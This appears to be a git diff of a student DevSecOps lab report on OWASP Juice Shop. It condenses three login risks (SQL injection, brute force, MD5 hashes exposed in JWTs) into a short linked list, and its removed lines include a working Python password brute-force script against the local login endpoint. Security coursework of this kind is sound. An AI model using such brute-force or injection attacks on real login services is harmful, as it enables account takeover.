@@ -44,53 +44,10 @@
 
 ## Risks Observed (Top 3)
 
-### Top Priority Risk: direct data substitution into login SQL request
+1. Login SQL injection enables the attacker to access any user account while only knowing the username
+	- [Corresponding GitHub issue](https://github.com/DmitriyProkopyev/F25-DevSecOps-Intro/issues/1)
+2. Login credentials bruteforce enables the attacker to access any user account if the username is known and the password is weak
+	- [Corresponding GitHub issue](https://github.com/DmitriyProkopyev/F25-DevSecOps-Intro/issues/2)
+3. Reverse password lookup enables the attacker to acquire the password of any user if the credentials storage (hashes) is leaked or a JWT token (regardless of expiration date) is stolen, and the password is weak
+	- [Corresponding GitHub issue](https://github.com/DmitriyProkopyev/F25-DevSecOps-Intro/issues/3)
 
-> The `/rest/user/login` endpoint lacks query parametrization, leading to susceptibility to SQL injections, which grants an attacker access to any account in the system if the corresponding username is known.
-
-**SQL injection on the login form (using an incorrect password)**:
-![](https://i.ibb.co/r2yJhMwK/Pasted-image-20251008182653.png)
-
-**The injection result**:
-![](https://i.ibb.co/jY1g8M7/Pasted-image-20251008182629.png)
-
-### Second Priority Risk: login bruteforce susceptibility
-
-> The `/rest/user/login` endpoint does not introduce any timeout or attempt limits, enabling an attacker to quickly perform online bruteforce using common passwords for any account including the administrator.
-
-**An attack script**:
-```python
-# bruteforce.py
-import requests
-
-with open('/home/control/DevSecOpsLab1/passwords.txt') as f:
-    for password in f:
-        password = password.strip()
-        resp = requests.post(
-            'http://127.0.0.1:3000/rest/user/login',
-            json={"email": "admin@juice-sh.op", "password": password}
-        )
-        if resp.status_code == 200 or 'authentication' in resp.text:
-            print(f"Found: {password}")
-            break
-        print(f"Tried: {password}")
-```
-
-**The attack result**:
-![](https://i.ibb.co/Hftj3VC5/Pasted-image-20251008182251.png)
-
-**Admin account theft verification**:
-![](https://i.ibb.co/Pz5Hq55p/Pasted-image-20251008174015.png)
-
-### Third Priority Risk: insecure password containment
-
-> The system stores user passwords as raw MD5 hashes, enabling the attackers to reverse engineer user passwords with an MD5 rainbow table if the database leak occurs or an (expired) JWT token of a user gets stolen.
-
-**Assume a JWT token (active or expired) is stolen**:
-![](https://i.ibb.co/Ldry3McP/Pasted-image-20251008164142.png)
-
-**The payload of the JWT token contains raw MD5 password hash**:
-![](https://i.ibb.co/Fkp52fyd/Pasted-image-20251008164214.png)
-
-**An online rainbow table can be used to reverse engineer the password**:
-![](https://i.ibb.co/fGCRt6nJ/Pasted-image-20251008164034.png)
